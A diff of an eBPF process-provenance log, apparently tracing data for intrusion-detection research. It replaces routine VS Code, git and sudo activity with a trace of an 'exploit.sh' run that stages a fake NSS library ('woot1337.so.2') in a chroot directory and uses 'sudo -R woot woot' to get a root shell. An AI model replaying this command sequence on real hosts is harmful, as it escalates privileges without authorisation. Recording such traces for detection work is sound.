@@ -1,221 +1,66 @@
-CLONE3|33006|32948|5076525037973
-CLONE|33007|7729|5077659736278
-EXEC|execve|5077660073803|33007|7729|1000|code|/bin/sh -c which ps
-EXEC|execve|5077662585679|33008|33007|1000|sh|which ps
-EXEC|execve|5077669587964|33009|7729|1000|code|/bin/sh -c /usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
-EXEC|execve|5077672455112|33010|33009|1000|sh|/usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
-EXEC|execve|5077696006216|33011|7729|1000|code|/bin/sh -c "/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh" 7761 9511 10274 23259 23475 32946 9516 10275 23260 23476 32947 951
-EXEC|execve|5077698501123|33012|33011|1000|sh|/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh 7761 9511 10274 23259 23475 32946 9516 10275 23260 23476 32947 9517 10276 23261 23477 32948
-EXEC|execve|5077701688482|33013|33012|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
-EXEC|execve|5077704379404|33014|33012|1000|cpuUsage.sh|cat /proc/7761/stat
-EXEC|execve|5077705525675|33015|33012|1000|cpuUsage.sh|cat /proc/9511/stat
-EXEC|execve|5077706740891|33016|33012|1000|cpuUsage.sh|cat /proc/10274/stat
-EXEC|execve|5077707918368|33017|33012|1000|cpuUsage.sh|cat /proc/23259/stat
-EXEC|execve|5077708999494|33018|33012|1000|cpuUsage.sh|cat /proc/23475/stat
-EXEC|execve|5077710074028|33019|33012|1000|cpuUsage.sh|cat /proc/32946/stat
-EXEC|execve|5077711283486|33020|33012|1000|cpuUsage.sh|cat /proc/9516/stat
-EXEC|execve|5077712429191|33021|33012|1000|cpuUsage.sh|cat /proc/10275/stat
-EXEC|execve|5077713629891|33022|33012|1000|cpuUsage.sh|cat /proc/23260/stat
-EXEC|execve|5077717906182|33023|33012|1000|cpuUsage.sh|cat /proc/23476/stat
-EXEC|execve|5077720472628|33024|33012|1000|cpuUsage.sh|cat /proc/32947/stat
-EXEC|execve|5077722040329|33025|33012|1000|cpuUsage.sh|cat /proc/9517/stat
-EXEC|execve|5077723490397|33026|33012|1000|cpuUsage.sh|cat /proc/10276/stat
-EXEC|execve|5077724687220|33027|33012|1000|cpuUsage.sh|cat /proc/23261/stat
-EXEC|execve|5077725906315|33028|33012|1000|cpuUsage.sh|cat /proc/23477/stat
-EXEC|execve|5077727021736|33029|33012|1000|cpuUsage.sh|cat /proc/32948/stat
-EXEC|execve|5077728010480|33030|33012|1000|cpuUsage.sh|sleep 1
-CLONE|33031|10333|5078602381855
-EXEC|execve|5078602696955|33031|10333|1000|bash|sudo ls -l
-FILE_CREATE|1000|33031|0|0|/run/sudo/ts/ubuntu|sudo
-CLONE|33032|33012|5078729853850
-EXEC|execve|5078730334544|33032|33012|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
-EXEC|execve|5078733079868|33033|33012|1000|cpuUsage.sh|cat /proc/7761/stat
-EXEC|execve|5078736061066|33035|33012|1000|cpuUsage.sh|cat /proc/9511/stat
-EXEC|execve|5078738814900|33037|33012|1000|cpuUsage.sh|cat /proc/10274/stat
-EXEC|execve|5078740971230|33039|33012|1000|cpuUsage.sh|cat /proc/23259/stat
-EXEC|execve|5078743013989|33041|33012|1000|cpuUsage.sh|cat /proc/23475/stat
-EXEC|execve|5078745108706|33043|33012|1000|cpuUsage.sh|cat /proc/32946/stat
-EXEC|execve|5078746872762|33045|33012|1000|cpuUsage.sh|cat /proc/9516/stat
-EXEC|execve|5078748586304|33047|33012|1000|cpuUsage.sh|cat /proc/10275/stat
-EXEC|execve|5078752946292|33049|33012|1000|cpuUsage.sh|cat /proc/23260/stat
-EXEC|execve|5078755019994|33051|33012|1000|cpuUsage.sh|cat /proc/23476/stat
-EXEC|execve|5078756729379|33053|33012|1000|cpuUsage.sh|cat /proc/32947/stat
-EXEC|execve|5078758392739|33055|33012|1000|cpuUsage.sh|cat /proc/9517/stat
-EXEC|execve|5078760119904|33057|33012|1000|cpuUsage.sh|cat /proc/10276/stat
-EXEC|execve|5078761819530|33059|33012|1000|cpuUsage.sh|cat /proc/23261/stat
-EXEC|execve|5078763578758|33061|33012|1000|cpuUsage.sh|cat /proc/23477/stat
-EXEC|execve|5078765464723|33063|33012|1000|cpuUsage.sh|cat /proc/32948/stat
-CLONE|33065|7670|5079704749654
-EXEC|execve|5079705916814|33065|7670|1000|code|git check-ignore -v -z --stdin
-EXEC|execve|5079980037541|33066|939|999|agent|blkid
-CLONE|33132|33031|5080014777349
-EXEC|execve|5080018261911|33138|33132|0|sudo|ls -l
-CLONE|33138|33132|5080017866099
-FILE_CREATE|1000|20413|0|0|/run/sudo/ts/ubuntu|sudo
-CLONE|33139|7670|5082568475282
-EXEC|execve|5082571351484|33139|7670|1000|code|git config --get commit.template
-CLONE3|33141|10311|5082608505715
-EXEC|execve|5082608943165|33140|7670|1000|code|git for-each-ref --format=%(refname)%00%(upstream:short)%00%(objectname)%00%(upstream:track)%00%(upstream:remotename)%00%(upstream:remoteref) refs/heads/main refs/remotes/main
-CLONE3|33142|3505|5082636604293
-CLONE3|33144|2920|5082637442019
-FILE_CREATE|1000|2879|0|0|/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/app.slice/app-org.gnome.Terminal.slice/cgroup.subtree_control|systemd
-CLONE|33145|7670|5082671094805
-EXEC|execve|5082677015303|33145|7670|1000|code|git status -z -uall
-EXEC|execve|5082706862605|33146|7670|1000|code|git for-each-ref --sort -committerdate --format %(refname)%00%(objectname)%00%(*objectname)
-FILE_CREATE|1000|7556|0|0|/home/ubuntu/.config/Code/User/workspaceStorage/50b0191937adee876102cae260821f1f/chatSessions/83c84780-71f5-4466-b406-a0584c3a5c69.json|libuv-worker
-FILE_CREATE|1000|7556|0|0|/home/ubuntu/.config/Code/User/workspaceStorage/50b0191937adee876102cae260821f1f/chatEditingSessions/83c84780-71f5-4466-b406-a0584c3a5c69/state.json|libuv-worker
-FILE_CREATE|1000|2879|0|0|/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/app.slice/app-org.gnome.Terminal.slice/cgroup.subtree_control|systemd
-FILE_CREATE|1000|2879|0|0|/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/app.slice/app-org.gnome.Terminal.slice/gnome-terminal-server.service/cgroup.subtree_control|systemd
-CLONE|33148|2879|5084820127779
-EXEC|execve|5084828475672|33148|2879|1000|(l-server)|/usr/libexec/gnome-terminal-server
-FILE_CREATE|1000|33148|0|0|/run/user/1000/dconf/user|gnome-terminal-
-CLONE3|33152|33148|5084967555024
-CLONE3|33165|33148|5085088618986
-CLONE3|33168|3389|5085089397856
-FILE_CREATE|1000|33148|0|0|/home/ubuntu/.cache/event-sound-cache.tdb.cef2eb6cc724476ba7c4029f1b986fe1.x86_64-pc-linux-gnu|gnome-terminal-
-EXEC|execve|5085147992596|33171|33148|1000|gnome-terminal-|bash
-FILE_CREATE|1000|2879|0|0|/run/user/1000/systemd/transient/vte-spawn-fb16bbf3-3c4c-4888-8741-388e1ab6183a.scope|systemd
-FILE_CREATE|1000|2879|0|0|/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/app.slice/app-org.gnome.Terminal.slice/vte-spawn-fb16bbf3-3c4c-4888-8741-388e1ab6183a.scope/cgroup.subtree_control|systemd
-EXEC|execve|5085169918678|33172|33171|1000|bash|lesspipe
-EXEC|execve|5085172085532|33173|33172|1000|lesspipe|basename /usr/bin/lesspipe
-EXEC|execve|5085175001118|33175|33174|1000|lesspipe|dirname /usr/bin/lesspipe
-CLONE|33175|33174|5085174855375
-EXEC|execve|5085180304170|33176|33171|1000|bash|dircolors -b
-FILE_CREATE|1000|33171|0|0|/dev/null|bash
-EXEC|execve|5087864440068|33177|940|0|installer|/opt/datadog-agent/embedded/bin/installer get-states
-FILE_CREATE|0|33177|0|0|/opt/datadog-packages/packages.db|installer
-EXEC|execve|5088393648263|33184|940|0|installer|/opt/datadog-agent/embedded/bin/installer get-states
-FILE_CREATE|0|33184|0|0|/opt/datadog-packages/packages.db|installer
-CLONE|33192|33171|5089098528157
-EXEC|execve|5089098762514|33192|33171|1000|bash|sudo ls -l
-FILE_CREATE|1000|33192|0|0|/run/sudo/ts/ubuntu|sudo
-CLONE|33193|33192|5089912365200
-CLONE|33194|33193|5089913498533
-EXEC|execve|5089913670738|33194|33193|0|sudo|ls -l
-CLONE3|33195|33148|5089944931227
-CLONE3|33199|3505|5091656182905
-FILE_CREATE|1000|2879|0|0|/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/app.slice/app-org.gnome.Terminal.slice/cgroup.subtree_control|systemd
-CLONE|33200|7670|5092226658856
-EXEC|execve|5092228063440|33200|7670|1000|code|git config --get commit.template
-EXEC|execve|5092251889282|33201|7670|1000|code|git for-each-ref --format=%(refname)%00%(upstream:short)%00%(objectname)%00%(upstream:track)%00%(upstream:remotename)%00%(upstream:remoteref) refs/heads/main refs/remotes/main
-EXEC|execve|5092296521186|33202|7670|1000|code|git status -z -uall
-EXEC|execve|5092326743839|33203|7670|1000|code|git for-each-ref --sort -committerdate --format %(refname)%00%(objectname)%00%(*objectname)
-EXEC|execve|5094035771485|33204|7729|1000|code|/bin/sh -c which ps
-CLONE|33204|7729|5094034932992
-EXEC|execve|5094040125112|33205|33204|1000|sh|which ps
-EXEC|execve|5094044048905|33206|7729|1000|code|/bin/sh -c /usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
-EXEC|execve|5094046936469|33207|33206|1000|sh|/usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
-EXEC|execve|5094086940500|33208|7729|1000|code|/bin/sh -c "/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh" 7761 9511 10274 23259 23475 32946 9516 10275 23260 23476 32947 951
-EXEC|execve|5094090989271|33209|33208|1000|sh|/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh 7761 9511 10274 23259 23475 32946 9516 10275 23260 23476 32947 9517 10276 23261 23477 32948
-EXEC|execve|5094094903821|33210|33209|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
-EXEC|execve|5094097972600|33211|33209|1000|cpuUsage.sh|cat /proc/7761/stat
-EXEC|execve|5094101454539|33212|33209|1000|cpuUsage.sh|cat /proc/9511/stat
-EXEC|execve|5094103021992|33213|33209|1000|cpuUsage.sh|cat /proc/10274/stat
-EXEC|execve|5094104473534|33214|33209|1000|cpuUsage.sh|cat /proc/23259/stat
-EXEC|execve|5094106183770|33215|33209|1000|cpuUsage.sh|cat /proc/23475/stat
-EXEC|execve|5094107642366|33216|33209|1000|cpuUsage.sh|cat /proc/32946/stat
-EXEC|execve|5094109022145|33217|33209|1000|cpuUsage.sh|cat /proc/9516/stat
-EXEC|execve|5094110332893|33218|33209|1000|cpuUsage.sh|cat /proc/10275/stat
-EXEC|execve|5094112036397|33219|33209|1000|cpuUsage.sh|cat /proc/23260/stat
-EXEC|execve|5094113355019|33220|33209|1000|cpuUsage.sh|cat /proc/23476/stat
-EXEC|execve|5094114606365|33221|33209|1000|cpuUsage.sh|cat /proc/32947/stat
-EXEC|execve|5094117609188|33222|33209|1000|cpuUsage.sh|cat /proc/9517/stat
-EXEC|execve|5094121688691|33223|33209|1000|cpuUsage.sh|cat /proc/10276/stat
-EXEC|execve|5094123514345|33224|33209|1000|cpuUsage.sh|cat /proc/23261/stat
-EXEC|execve|5094125145483|33225|33209|1000|cpuUsage.sh|cat /proc/23477/stat
-EXEC|execve|5094126802830|33226|33209|1000|cpuUsage.sh|cat /proc/32948/stat
-EXEC|execve|5094128875707|33227|33209|1000|cpuUsage.sh|sleep 1
-EXEC|execve|5094977607208|33228|939|999|agent|blkid
-CLONE|33299|33209|5095131543014
-EXEC|execve|5095132060294|33299|33209|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
-EXEC|execve|5095136107011|33300|33209|1000|cpuUsage.sh|cat /proc/7761/stat
-EXEC|execve|5095138633348|33302|33209|1000|cpuUsage.sh|cat /proc/9511/stat
-EXEC|execve|5095140438282|33304|33209|1000|cpuUsage.sh|cat /proc/10274/stat
-EXEC|execve|5095142305448|33306|33209|1000|cpuUsage.sh|cat /proc/23259/stat
-EXEC|execve|5095144164444|33308|33209|1000|cpuUsage.sh|cat /proc/23475/stat
-EXEC|execve|5095145979520|33310|33209|1000|cpuUsage.sh|cat /proc/32946/stat
-EXEC|execve|5095148739936|33312|33209|1000|cpuUsage.sh|cat /proc/9516/stat
-EXEC|execve|5095152318993|33314|33209|1000|cpuUsage.sh|cat /proc/10275/stat
-EXEC|execve|5095154306165|33316|33209|1000|cpuUsage.sh|cat /proc/23260/stat
-EXEC|execve|5095156348572|33318|33209|1000|cpuUsage.sh|cat /proc/23476/stat
-EXEC|execve|5095158855610|33320|33209|1000|cpuUsage.sh|cat /proc/32947/stat
-EXEC|execve|5095160626180|33322|33209|1000|cpuUsage.sh|cat /proc/9517/stat
-EXEC|execve|5095162355593|33324|33209|1000|cpuUsage.sh|cat /proc/10276/stat
-EXEC|execve|5095164355154|33326|33209|1000|cpuUsage.sh|cat /proc/23261/stat
-EXEC|execve|5095168627883|33328|33209|1000|cpuUsage.sh|cat /proc/23477/stat
-EXEC|execve|5095171894829|33330|33209|1000|cpuUsage.sh|cat /proc/32948/stat
-FILE_CREATE|1000|7556|0|0|/home/ubuntu/.config/Code/User/globalStorage/state.vscdb-journal|libuv-worker
-FILE_CREATE|1000|7556|0|0|/home/ubuntu/.config/Code/User/workspaceStorage/50b0191937adee876102cae260821f1f/state.vscdb-journal|libuv-worker
-CLONE|33332|7670|5097356606377
-EXEC|execve|5097356967572|33332|7670|1000|code|git config --get commit.template
-EXEC|execve|5097364536467|33333|7670|1000|code|git for-each-ref --format=%(refname)%00%(upstream:short)%00%(objectname)%00%(upstream:track)%00%(upstream:remotename)%00%(upstream:remoteref) refs/heads/main refs/remotes/main
-EXEC|execve|5097376283300|33334|7670|1000|code|git status -z -uall
-EXEC|execve|5097386497102|33335|7670|1000|code|git for-each-ref --sort -committerdate --format %(refname)%00%(objectname)%00%(*objectname)
-CLONE|33336|7670|5102403276926
-EXEC|execve|5102403635230|33336|7670|1000|code|git config --get commit.template
-EXEC|execve|5102410454265|33337|7670|1000|code|git for-each-ref --format=%(refname)%00%(upstream:short)%00%(objectname)%00%(upstream:track)%00%(upstream:remotename)%00%(upstream:remoteref) refs/heads/main refs/remotes/main
-EXEC|execve|5102421970060|33338|7670|1000|code|git status -z -uall
-EXEC|execve|5102431838206|33339|7670|1000|code|git for-each-ref --sort -committerdate --format %(refname)%00%(objectname)%00%(*objectname)
-CLONE|33340|8658|5103292802244
-CLONE|33344|7670|5103538366309
-EXEC|execve|5103540097741|33344|7670|1000|code|git show --textconv :eBPFtracer.py
-EXEC|execve|5103562794394|33345|7670|1000|code|git ls-files --stage -- eBPFtracer.py
-EXEC|execve|5103586582616|33346|7670|1000|code|git cat-file -s 43cc57a2c3c87d13b1a495463f7ca86b49695927
-FILE_CREATE|1000|7556|0|0|/home/ubuntu/.config/Code/User/globalStorage/state.vscdb-journal|libuv-worker
-FILE_CREATE|1000|7556|0|0|/home/ubuntu/.config/Code/User/workspaceStorage/50b0191937adee876102cae260821f1f/state.vscdb-journal|libuv-worker
-CLONE|33347|7670|5107451720295
-EXEC|execve|5107452066407|33347|7670|1000|code|git config --get commit.template
-EXEC|execve|5107458128994|33348|7670|1000|code|git for-each-ref --format=%(refname)%00%(upstream:short)%00%(objectname)%00%(upstream:track)%00%(upstream:remotename)%00%(upstream:remoteref) refs/heads/main refs/remotes/main
-EXEC|execve|5107464803324|33349|7670|1000|code|git status -z -uall
-EXEC|execve|5107473362907|33350|7670|1000|code|git for-each-ref --sort -committerdate --format %(refname)%00%(objectname)%00%(*objectname)
-CLONE3|33351|1035|5107691180731
-EXEC|execve|5109977403328|33352|939|999|agent|blkid
-FILE_CREATE|998|1023|0|0|pg_xact/0000|postgres
-CLONE|33423|7670|5112488402455
-EXEC|execve|5112488792188|33423|7670|1000|code|git config --get commit.template
-EXEC|execve|5112496910853|33424|7670|1000|code|git for-each-ref --format=%(refname)%00%(upstream:short)%00%(objectname)%00%(upstream:track)%00%(upstream:remotename)%00%(upstream:remoteref) refs/heads/main refs/remotes/main
-EXEC|execve|5112510328651|33425|7670|1000|code|git status -z -uall
-EXEC|execve|5112517364835|33426|7670|1000|code|git for-each-ref --sort -committerdate --format %(refname)%00%(objectname)%00%(*objectname)
-FILE_CREATE|998|1023|0|0|pg_logical/replorigin_checkpoint.tmp|postgres
-FILE_CREATE|998|1027|0|0|pg_stat_tmp/global.tmp|postgres
-FILE_CREATE|998|1027|0|0|pg_stat_tmp/db_0.tmp|postgres
-FILE_CREATE|998|1027|0|0|pg_stat_tmp/global.tmp|postgres
-FILE_CREATE|998|1027|0|0|pg_stat_tmp/db_16384.tmp|postgres
-FILE_CREATE|998|1027|0|0|pg_stat_tmp/db_0.tmp|postgres
-FILE_CREATE|1000|7556|0|0|/home/ubuntu/.config/Code/User/globalStorage/state.vscdb-journal|libuv-worker
-FILE_CREATE|1000|7556|0|0|/home/ubuntu/.config/Code/User/workspaceStorage/50b0191937adee876102cae260821f1f/state.vscdb-journal|libuv-worker
-CLONE|33428|7670|5117537391417
-EXEC|execve|5117538040191|33428|7670|1000|code|git config --get commit.template
-EXEC|execve|5117545283079|33429|7670|1000|code|git for-each-ref --format=%(refname)%00%(upstream:short)%00%(objectname)%00%(upstream:track)%00%(upstream:remotename)%00%(upstream:remoteref) refs/heads/main refs/remotes/main
-EXEC|execve|5117560262736|33430|7670|1000|code|git status -z -uall
-EXEC|execve|5117574584737|33431|7670|1000|code|git for-each-ref --sort -committerdate --format %(refname)%00%(objectname)%00%(*objectname)
-EXEC|execve|5117861485604|33432|940|0|installer|/opt/datadog-agent/embedded/bin/installer get-states
-FILE_CREATE|0|33432|0|0|/opt/datadog-packages/packages.db|installer
-EXEC|execve|5118388832921|33440|940|0|installer|/opt/datadog-agent/embedded/bin/installer get-states
-FILE_CREATE|0|33440|0|0|/opt/datadog-packages/packages.db|installer
-CLONE3|33447|1045|5118643725485
-CLONE|33448|33440|5119162558567
-EXEC|execve|5119356181762|33449|7670|1000|code|git show --textconv :eBPFtracer.py
-CLONE|33449|7670|5119355435532
-FILE_CREATE|1000|7556|0|0|/home/ubuntu/.config/Code/User/globalStorage/state.vscdb-journal|libuv-worker
-FILE_CREATE|1000|7556|0|0|/home/ubuntu/.config/Code/User/workspaceStorage/50b0191937adee876102cae260821f1f/state.vscdb-journal|libuv-worker
-EXEC|execve|5119393846951|33450|7670|1000|code|git ls-files --stage -- eBPFtracer.py
-EXEC|execve|5119426128230|33451|7670|1000|code|git cat-file -s 43cc57a2c3c87d13b1a495463f7ca86b49695927
-FILE_CREATE|1000|7556|0|0|/home/ubuntu/.config/Code/User/workspaceStorage/50b0191937adee876102cae260821f1f/chatSessions/83c84780-71f5-4466-b406-a0584c3a5c69.json|libuv-worker
-FILE_CREATE|1000|7556|0|0|/home/ubuntu/.config/Code/User/workspaceStorage/50b0191937adee876102cae260821f1f/chatEditingSessions/83c84780-71f5-4466-b406-a0584c3a5c69/state.json|libuv-worker
-FILE_CREATE|1000|7556|0|0|/home/ubuntu/.config/Code/User/workspaceStorage/50b0191937adee876102cae260821f1f/state.vscdb-journal|libuv-worker
-CLONE|33452|7670|5122589029868
-EXEC|execve|5122589427065|33452|7670|1000|code|git config --get commit.template
-EXEC|execve|5122596348577|33453|7670|1000|code|git for-each-ref --format=%(refname)%00%(upstream:short)%00%(objectname)%00%(upstream:track)%00%(upstream:remotename)%00%(upstream:remoteref) refs/heads/main refs/remotes/main
-EXEC|execve|5122608132812|33454|7670|1000|code|git status -z -uall
-EXEC|execve|5122616508263|33455|7670|1000|code|git for-each-ref --sort -committerdate --format %(refname)%00%(objectname)%00%(*objectname)
-EXEC|execve|5124976808071|33456|939|999|agent|blkid
-CLONE|33527|8845|5125189024742
-EXEC|execve|5125190013056|33527|8845|1000|code|/usr/bin/python3 -W ignore -B -S -I /home/ubuntu/.vscode/extensions/ms-python.vscode-pylance-2025.10.4/dist/stub-generation/scrape_module.py _ctypes
-FILE_CREATE|1000|8845|0|0|/tmp/pyright-8845-6ugyKI17szSy/_ctypes-8845-eLYCB276OyII-.py|code
-FILE_CREATE|1000|8845|0|0|/tmp/pyright-8845-6ugyKI17szSy/_ctypes-8845-eLYCB276OyII-.py|code
-CLONE|33528|7670|5127632476221
-EXEC|execve|5127633119057|33528|7670|1000|code|git config --get commit.template
-EXEC|execve|5127642162971|33529|7670|1000|code|git for-each-ref --format=%(refname)%00%(upstream:short)%00%(objectname)%00%(upstream:track)%00%(upstream:remotename)%00%(upstream:remoteref) refs/heads/main refs/remotes/main
-EXEC|execve|5127655470015|33530|7670|1000|code|git status -z -uall
-EXEC|execve|5127664268391|33531|7670|1000|code|git for-each-ref --sort -committerdate --format %(refname)%00%(objectname)%00%(*objectname)
+EXEC|execve|512788310151|4162|3960|1000|bash|./exploit.sh
+CLONE|4162|3960|512788009524
+CLONE3|4163|3328|512789097333
+EXEC|execve|512792902527|4164|4162|1000|exploit.sh|mktemp -d /tmp/sudowoot.stage.XXXXXX
+EXEC|execve|512795317067|4165|4162|1000|exploit.sh|cat
+EXEC|execve|512797344131|4166|4162|1000|exploit.sh|mkdir -p woot/etc libnss_
+EXEC|execve|512799197618|4167|4162|1000|exploit.sh|cp /etc/group woot/etc
+EXEC|execve|512800881039|4168|4162|1000|exploit.sh|gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
+EXEC|execve|512803059100|4169|4168|1000|gcc|/usr/libexec/gcc/x86_64-linux-gnu/13/cc1 -quiet -imultiarch x86_64-linux-gnu woot1337.c -quiet -dumpdir libnss_/woot1337.so.2- -dumpbase woot1337.c -dumpbase-ext .c -mtune=generic -march=x86-64 -fPIC -fasynchronous-unwind-tables -fstack-protector-strong -Wformat -Wformat-security -fstack-clash-protection
+CLONE3|4170|3009|512819943032
+EXEC|execve|512822120382|4171|3009|1000|tracker-miner-f|/usr/libexec/tracker-extract-3 --socket-fd 3
+EXEC|execve|512840987159|4175|4168|1000|gcc|as --64 -o /tmp/ccbLjrqk.o /tmp/ccsOemWF.s
+EXEC|execve|512844774120|4176|4168|1000|gcc|/usr/libexec/gcc/x86_64-linux-gnu/13/collect2 -plugin /usr/libexec/gcc/x86_64-linux-gnu/13/liblto_plugin.so -plugin-opt=/usr/libexec/gcc/x86_64-linux-gnu/13/lto-wrapper -plugin-opt=-fresolution=/tmp/cc5zSQ1y.res -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lc -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s --build-id --eh-frame-hdr -m elf_x86_64 --hash-style=gnu --as-needed -shared -z relro -o
+EXEC|execve|512846597001|4177|4176|1000|collect2|/usr/bin/ld -plugin /usr/libexec/gcc/x86_64-linux-gnu/13/liblto_plugin.so -plugin-opt=/usr/libexec/gcc/x86_64-linux-gnu/13/lto-wrapper -plugin-opt=-fresolution=/tmp/cc5zSQ1y.res -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lc -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s --build-id --eh-frame-hdr -m elf_x86_64 --hash-style=gnu --as-needed -shared -z relro -o
+EXEC|execve|512878920896|4179|4162|1000|exploit.sh|sudo -R woot woot
+EXEC|execve|512893827177|4181|4179|0|bash|lesspipe
+EXEC|execve|512895917348|4182|4181|0|lesspipe|basename /usr/bin/lesspipe
+CLONE|4184|4183|512908709075
+EXEC|execve|512909764358|4184|4183|0|lesspipe|dirname /usr/bin/lesspipe
+EXEC|execve|512914917929|4185|4179|0|bash|dircolors -b
+CLONE3|4186|3009|512937466699
+CLONE3|4187|2458|514942652383
+CLONE3|4188|3009|514947428186
+EXEC|execve|517588379967|4189|4179|0|bash|id
+CLONE|4189|4179|517588208287
+CLONE3|4190|3009|517618544093
+CLONE|4191|4162|519038820484
+EXEC|execve|519039411493|4191|4162|1000|exploit.sh|rm -rf /tmp/sudowoot.stage.l7uzdU
+CLONE3|4192|3009|519061710670
+CLONE|4196|3328|534613792192
+CLONE|4197|4196|534618591770
+EXEC|execve|534619210390|4197|4196|1000|nautilus|/usr/lib/x86_64-linux-gnu/glib-2.0/gio-launch-desktop /usr/bin/gnome-text-editor /home/ubuntu/Documents/Provenance.log
+CLONE3|4199|3009|534628055311
+EXEC|execve|534630792669|4200|3009|1000|tracker-miner-f|/usr/libexec/tracker-extract-3 --socket-fd 3
+CLONE3|4212|3119|534712361051
+CLONE3|4214|4197|534774284422
+CLONE3|4224|2424|535743458721
+CLONE|4225|1378|535748333392
+CLONE3|4226|3009|535777546926
+CLONE3|4228|3009|535944302224
+CLONE|4229|3328|543343015214
+CLONE|4230|4229|543360453334
+EXEC|execve|543376536958|4230|4229|1000|nautilus|/usr/lib/x86_64-linux-gnu/glib-2.0/gio-launch-desktop /usr/bin/gnome-text-editor /home/ubuntu/Documents/Provenance.log
+CLONE3|4231|3009|543376897022
+CLONE|4243|1378|543501253239
+CLONE3|4245|2288|543524397826
+CLONE3|4246|3119|543524773144
+CLONE|4247|3328|547958624179
+CLONE|4248|4247|547965122362
+CLONE|4249|3009|547965693429
+EXEC|execve|547965860344|4248|4247|1000|nautilus|/usr/lib/x86_64-linux-gnu/glib-2.0/gio-launch-desktop /usr/bin/gnome-text-editor /home/ubuntu/Documents/Provenance.log
+EXEC|execve|547966236015|4249|3009|1000|tracker-miner-f|/usr/libexec/tracker-extract-3 --socket-fd 3
+CLONE|4262|1378|548072320557
+CLONE3|4264|3119|548083630715
+CLONE3|4265|3009|548191264922
+CLONE|4267|3328|562974923142
+CLONE|4268|4267|562982367891
+EXEC|execve|562984441135|4268|4267|1000|nautilus|/usr/lib/x86_64-linux-gnu/glib-2.0/gio-launch-desktop /usr/bin/gnome-text-editor /home/ubuntu/Documents/Provenance.log
+CLONE|4270|3009|562992521078
+EXEC|execve|562993665550|4270|3009|1000|tracker-miner-f|/usr/libexec/tracker-extract-3 --socket-fd 3
+CLONE3|4283|3119|563092360061
+CLONE|4284|1385|564808206273
+EXEC|execve|564817007801|4285|4284|0|cron|/bin/sh -c command -v debian-sa1 > /dev/null && debian-sa1 1 1
+EXEC|execve|564818703334|4286|4285|0|sh|debian-sa1 1 1
+CLONE|4285|4284|564814659044
+CLONE3|4287|3009|564845436375
